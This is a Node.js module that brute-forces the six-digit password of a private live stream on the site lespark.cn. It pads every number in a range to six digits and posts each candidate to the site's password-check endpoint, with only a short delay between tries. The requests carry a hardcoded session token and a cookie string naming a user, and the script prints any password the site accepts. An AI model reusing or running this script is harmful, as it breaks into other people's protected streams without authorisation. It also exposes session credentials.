const formData = require('form-data');
const fetch = require('node-fetch');

/**
 * wait for xxxx ms
 * @param {number} time 
 */
const wait = (time) => new Promise((resolve) => {
  setTimeout(() => { resolve(time); }, time);
});

/**
 * try one password
 * @param {string} pwd 
 */
const tryPwd = async (pwd, id = '5df9b47181171731bc5a51e5') => {
  const fData = new formData();
  fData.append('live_view_pwd', pwd);
  fData.append('live_obj_id', id);

  const res = await fetch('http://www.lespark.cn/secret_live_pwd/judge', {
    method: 'POST',
    // body: fData,
    body: `live_view_pwd=${pwd}&live_obj_id=${id}&`,
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      token: '39fe1d0deeb89662f82545d47b97c145',
      Cookie: 'gr_user_id=e4d8bf16-3286-48d8-a066-e5fa7e90709a; language=English; source=; grwng_uid=9b7dceb6-4a3c-4027-90ec-c12aa9494ad9; token=39fe1d0deeb89662f82545d47b97c145; user_id=5d94c8fdf7794d71bb2af74a; avatar=http%3A%2F%2Fimg2.lespark.cn%2Favatar%2Fali86MWYIfVDHcnlr_150x150; lgid=9132142; nickname=yyc; be366bc92047ce43_gr_session_id=d1e4d8e2-a7dc-4a47-be41-46fc39eb41d0; be366bc92047ce43_gr_session_id_d1e4d8e2-a7dc-4a47-be41-46fc39eb41d0=true; Hm_lvt_01e86260df9ef3ac945a13ba3c90ed64=1576036444,1576651990; Hm_lpvt_01e86260df9ef3ac945a13ba3c90ed64=1576652864',
      'bundle-id': 'pc',
      user_id: '5d94c8fdf7794d71bb2af74a'
    },
  });

  try {
    const response = await res.json();
    // console.log(`live_view_pwd=${pwd}&live_obj_id=${id}`);
    if (response.msg === 'ok') {
      console.log(pwd);
      console.log(response);
    }
    return true;
  } catch (err) {
    console.log(err);
    console.log(pwd);
    const response = await res.text();
    console.log(response);
    return false;
  }
};

/**
 * Fill password with digits: xxx => 000xxx
 * @param {string} pwd password 
 * @param {number} totalDigits total digits of a password
 * @param {number} fillWith
 */
const fillDigits = (pwd, totalDigits = 6, fillWith = 0, poisition = 'before') => {
  const digitsToFill = totalDigits - `${pwd}`.length;
  const placeholder = [ ...Array(digitsToFill) ].fill(fillWith).join('');
  return poisition === 'before' ? `${placeholder}${pwd}` : `${pwd}${placeholder}`;
};

/**
 * get all passwords
 * @param {number} from
 * @param {number} to
 */
const getAllPwds = (from = 0, to = 0) => {
  const result = [];

  for(let i = from; i < to + 1; i++) {
    result.push(i);
  }
  return result;
}
  // [ ...Array(limit) ].map((val, index) => `${index}`);

/**
 * fill all passwords 
 * @param {*} password 
 */
const fillAllPwds = (pwds) => pwds.map((pwd) => fillDigits(pwd));

/**
 * start trying passwords
 * @param {object} argv
 * @param {number} argv.from
 * @param {number} argv.to
 * @param {string} mode options ["full", "original"]
 */
const start = async ({ from = 0, to = 0, id, waitfor = 10, mode }) => {
  const pwds = getAllPwds(from, to);

  const pwdsFullDigits = fillAllPwds(pwds).sort((a, b) => a > b);
  const allPwds = mode === 'all' ? [ ...pwds, pwdsFullDigits ] : pwdsFullDigits;

  console.log(`start from ${from} to ${to}`);

  let failedOnce = true;

  allPwds.forEach(async (code) => {
    if (failedOnce) {
      console.log(code);
    }

    await wait(waitfor);
    await tryPwd(code, id);
  });
};

module.exports = {
  wait,
  tryPwd,
  fillDigits,
  getAllPwds,
  fillAllPwds,
  start,
};
